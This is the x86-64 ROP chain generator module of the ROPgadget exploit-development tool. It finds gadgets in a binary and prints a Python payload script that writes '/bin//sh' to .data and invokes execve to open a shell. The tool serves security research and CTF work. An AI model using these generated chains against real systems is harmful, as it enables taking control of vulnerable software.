#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#  Jonathan Salwan - 2014-05-13
#  Florian Meier - 2014-08-31 - The 64b ROP chain generation
#
#  http://shell-storm.org
#  http://twitter.com/JonathanSalwan
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software  Foundation, either  version 3 of  the License, or
#  (at your option) any later version.
#

import re


class ROPMakerX64:
    def __init__(self, data_section, gadgets, liboffset=0x0):
        self.__data_section = data_section
        self.__gadgets = gadgets

        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset

        self.__generate()

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            regex = re.search(
                "mov .* ptr \[(?P<dst>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))\], (?P<src>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))$",
                f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget, regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        if g != "ret":
                            # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print("\tp += pack('<Q', 0x%016x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                except KeyError:
                    print("\tp += pack('<Q', 0x4141414141414141) # padding")

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):

        section = self.__data_section
        dataAddr = None
        if section["name"] == ".data":
            dataAddr = section["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        print("\t#!/usr/bin/env python2")
        print("\t# execve generated by ROPgadget\n")
        print("\tfrom struct import pack\n")

        print("\t# Padding goes here")
        print("\tp = ''\n")

        print("\tp += pack('<Q', 0x%016x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("\tp += pack('<Q', 0x%016x) # @ .data" % dataAddr)
        self.__padding(popDst, {})

        print("\tp += pack('<Q', 0x%016x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("\tp += '/bin//sh'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        print("\tp += pack('<Q', 0x%016x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp += pack('<Q', 0x%016x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("\tp += pack('<Q', 0x%016x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popDst, {})

        print("\tp += pack('<Q', 0x%016x) # %s" % (xorSrc["vaddr"], xorSrc["gadget"]))
        self.__padding(xorSrc, {})

        print("\tp += pack('<Q', 0x%016x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("\tp += pack('<Q', 0x%016x) # %s" % (popRdi["vaddr"], popRdi["gadget"]))
        print("\tp += pack('<Q', 0x%016x) # @ .data" % dataAddr)
        self.__padding(popRdi, {})

        print("\tp += pack('<Q', 0x%016x) # %s" % (popRsi["vaddr"], popRsi["gadget"]))
        print("\tp += pack('<Q', 0x%016x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popRsi, {"rdi": dataAddr})  # Don't overwrite rdi

        print("\tp += pack('<Q', 0x%016x) # %s" % (popRdx["vaddr"], popRdx["gadget"]))
        print("\tp += pack('<Q', 0x%016x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        print("\tp += pack('<Q', 0x%016x) # %s" % (xorRax["vaddr"], xorRax["gadget"]))
        self.__padding(xorRax, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        for i in range(59):
            print("\tp += pack('<Q', 0x%016x) # %s" % (incRax["vaddr"], incRax["gadget"]))
            self.__padding(incRax, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        print("\tp += pack('<Q', 0x%016x) # %s" % (syscall["vaddr"], syscall["gadget"]))

    def __generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                print("\t[-] Can't find the 'mov qword ptr [r64], r64' gadget")
                return

            popDst = self.__lookingForSomeThing("pop %s" % (write4where[1]))
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[1]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % (write4where[2]))
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [reg], reg'\n" % (
                    write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorRax = self.__lookingForSomeThing("xor rax, rax")
        if not xorRax:
            print("\t[-] Can't find the 'xor rax, rax' instuction")
            return

        incRax = self.__lookingForSomeThing("inc rax")
        incEax = self.__lookingForSomeThing("inc eax")
        incAx = self.__lookingForSomeThing("inc al")
        addRax = self.__lookingForSomeThing("add rax, 1")
        addEax = self.__lookingForSomeThing("add eax, 1")
        addAx = self.__lookingForSomeThing("add al, 1")

        instr = [incRax, incEax, incAx, addRax, addEax, addAx]

        if all(v is None for v in instr):
            print("\t[-] Can't find the 'inc rax' or 'add rax, 1' instuction")
            return

        for i in instr:
            if i is not None:
                incRax = i
                break

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popRdi = self.__lookingForSomeThing("pop rdi")
        if not popRdi:
            print("\t[-] Can't find the 'pop rdi' instruction")
            return

        popRsi = self.__lookingForSomeThing("pop rsi")
        if not popRsi:
            print("\t[-] Can't find the 'pop rsi' instruction")
            return

        popRdx = self.__lookingForSomeThing("pop rdx")
        if not popRdx:
            print("\t[-] Can't find the 'pop rdx' instruction")
            return

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("syscall")
        if not syscall:
            print("\t[-] Can't find the 'syscall' instruction")
            return

        print("\n- Step 5 -- Build the ROP chain\n")

        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall)
